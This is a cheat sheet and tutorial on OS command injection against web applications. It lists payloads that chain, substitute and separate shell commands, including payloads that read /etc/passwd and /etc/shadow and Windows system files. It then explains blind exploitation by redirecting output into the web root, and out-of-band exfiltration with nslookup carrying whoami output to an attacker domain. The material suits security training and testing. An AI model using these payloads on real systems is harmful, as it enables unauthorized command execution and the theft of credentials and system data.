1. Basic Command Injection:
   - `;ls` - Executes the `ls` command on Unix-based systems.
   - `& dir` - Executes the `dir` command on Windows systems.
   - `| cat /etc/passwd` - Pipes the output of a command to the `cat` command to display the contents of `/etc/passwd` file on Unix-based systems.
   - `&& whoami` - Executes the `whoami` command after the original command, typically used to determine the current user.

2. Command Chaining:
   - `;ls;` - Executes the `ls` command followed by an empty command, which is often used to terminate the original command and execute subsequent commands.
   - `& ping -n 5 127.0.0.1` - Chains the `ping` command to perform a network operation after the original command on Windows systems.

3. Command Substitution:
   - `$(ls)` - Executes the `ls` command and substitutes the output of the command within the original command.
   - `$(cat /etc/passwd)` - Substitutes the contents of the `/etc/passwd` file within the original command.

4. Operating System Specific Payloads:
   - Unix-based Systems:
     - `| cat /etc/passwd` - Displays the contents of the `/etc/passwd` file.
     - `| cat /etc/shadow` - Displays the contents of the `/etc/shadow` file (requires root privileges).
     - `| sudo cat /etc/shadow` - Displays the contents of the `/etc/shadow` file using `sudo`.
   - Windows Systems:
     - `& type C:\Windows\System32\drivers\etc\hosts` - Displays the contents of the `hosts` file on Windows systems.
     - `& ipconfig /all` - Displays the network configuration on Windows systems.
Exploiting blind OS command injection by redirecting output

You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location /var/www/static, then you can submit the following input:
& whoami > /var/www/static/whoami.txt &

The > character sends the output from the whoami command to the specified file. You can then use the browser to fetch https://vulnerable-website.com/whoami.txt to retrieve the file, and view the output from the injected command. 

Exploiting blind OS command injection using out-of-band (OAST) techniques

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
& nslookup kgji2ohoyw.web-attacker.com &

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected. 

 The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &

This will cause a DNS lookup to the attacker's domain containing the result of the whoami command:
wwwuser.kgji2ohoyw.web-attacker.com

Ways of injecting OS commands

A variety of shell metacharacters can be used to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

    &
    &&
    |
    ||

The following command separators work only on Unix-based systems:

    ;
    Newline (0x0a or \n)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

    `
    injected command `
    $(
    injected command )

Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command. 
